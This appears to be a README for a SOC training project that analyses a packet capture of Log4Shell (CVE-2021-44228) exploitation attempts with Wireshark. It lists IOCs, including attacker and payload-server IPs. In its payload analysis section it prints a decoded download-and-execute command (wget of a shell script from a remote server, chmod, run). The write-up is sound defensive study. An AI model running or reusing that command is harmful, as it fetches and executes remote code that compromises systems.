# Log4Shell (CVE-2021-44228) Threat Hunting & Incident Investigation

## Overview

This project documents a SOC-style investigation of a packet capture (PCAP) containing Log4Shell (CVE-2021-44228) exploitation attempts. The analysis was performed using Wireshark to identify malicious activity, investigate attacker behavior, and determine whether the target system was successfully compromised.

## Objectives

- Analyze network traffic within the PCAP file.
- Identify suspicious hosts and protocols.
- Detect Log4Shell exploitation attempts.
- Extract and analyze malicious payloads.
- Verify whether exploitation was successful.
- Document findings and Indicators of Compromise (IOCs).

## Investigation Workflow

1. Protocol Hierarchy Analysis
2. Endpoint Identification
3. HTTP Traffic Inspection
4. JNDI/LDAP Payload Hunting
5. Payload Extraction and Decoding
6. Exploitation Verification
7. Incident Assessment

## Key Findings

- Identified multiple Log4Shell exploitation attempts targeting a public-facing server.
- Discovered JNDI LDAP payloads embedded within HTTP requests.
- Observed both vulnerability scanning and active exploitation activity.
- Extracted a Base64-encoded payload intended to download and execute a shell script.
- Identified attacker infrastructure associated with the exploit attempts.
- Found no evidence of successful LDAP callbacks or malware execution.

## Indicators of Compromise (IOCs)

| Type | Value |
|--------|--------|
| Target Host | 198.71.247.91 |
| Attacker IP | 45.137.21.9 |
| Payload Server | 62.210.130.250 |
| Vulnerability | CVE-2021-44228 (Log4Shell) |
| Downloaded File | lh.sh |

## Malicious Payload Analysis

The following Base64-encoded command was extracted from a JNDI LDAP payload:

```bash
wget http://62.210.130.250/lh.sh;
chmod +x lh.sh;
./lh.sh
```

### Attacker Intent

1. Download a remote shell script.
2. Grant execution permissions.
3. Execute the downloaded script.
4. Achieve Remote Code Execution (RCE) on the target system.

## Investigation Outcome

The analysis confirmed multiple Log4Shell exploitation attempts against the target server. Attackers leveraged JNDI LDAP payloads and command execution techniques commonly associated with Log4Shell attacks.

Although exploitation attempts were clearly observed, no evidence was found indicating:

- Successful LDAP callback activity
- Malware downloads
- Reverse shell connections
- Command-and-Control (C2) communication
- Successful system compromise

Based on the available network evidence, the activity was classified as **Attempted Exploitation** rather than a confirmed compromise.

## Tools Used

- Wireshark
- TCP Stream Analysis
- HTTP Protocol Analysis
- Base64 Payload Decoding

## Skills Demonstrated

- Network Traffic Analysis
- Threat Hunting
- Incident Investigation
- IOC Identification
- Payload Analysis
- Wireshark Packet Analysis
- Log4Shell Detection
- SOC Analyst Methodology


## Disclaimer

This investigation was conducted in a controlled learning environment for educational and cybersecurity training purposes. All analysis was performed on provided packet capture data without interacting with live systems.
